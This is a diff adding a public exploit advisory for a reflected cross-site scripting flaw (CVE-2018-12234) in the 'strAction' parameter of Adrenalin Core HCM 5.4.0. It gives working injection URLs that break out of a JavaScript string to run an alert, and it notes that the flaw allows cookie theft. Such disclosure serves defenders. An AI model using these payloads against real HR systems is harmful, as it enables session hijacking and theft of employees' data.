@@ -1,0 +1,43 @@
+# Exploit Title: Adrenalin Core HCM 5.4.0 - 'strAction' Reflected Cross-Site Scripting
+# Google Dork: NA
+# Date: 2018-09-06
+# Exploit Author: Rishu Ranjan (Cy83rl0gger)
+# Vendor Homepage: https://www.myadrenalin.com/
+# Software Link: https://www.myadrenalin.com/core-hcm/
+# Version: 5.4.0 (REQUIRED)
+# Tested on: NA
+# CVE : CVE-2018-12234
+# Type: webapps
+# Platform: Multiple
+
+# Description
+# ====================
+# A Reflected Cross Site Scripting (XSS) Vulnerability was discovered in Adrenalin Core HCM v5.4.0 of HRMS Software. 
+# The user supplied input containing malicious JavaScript is echoed back as it is in JavaScript code in an HTML response.
+
+# URL
+# ====================
+
+https://<Host:port>/Adrenalin/flexiportal/GeneralInfo.aspx?strAction=Update0%22[Javascript code]22HRMS%22%29%2f%2f1
+https://<Host:port>/myadrenalin/flexiportal/GeneralInfo.aspx?strAction=Update11170%22%3balert(%22HRMS%22)%2f%2f155
+
+Parameter
+====================
+strAction
+
+Attack Type
+====================
+Remote
+
+CVE Impact Other
+====================
+Allows an attacker to input malicious JavaScript which can steal cookie, redirect them to other malicious website, etc.
+
+Reference
+====================
+https://nvd.nist.gov/vuln/detail/CVE-2018-12234
+https://www.knowcybersec.com/2018/09/first-cve-2018-12234-reflected-XSS.html
+
+Discoverer
+====================
+Rishu Ranjan
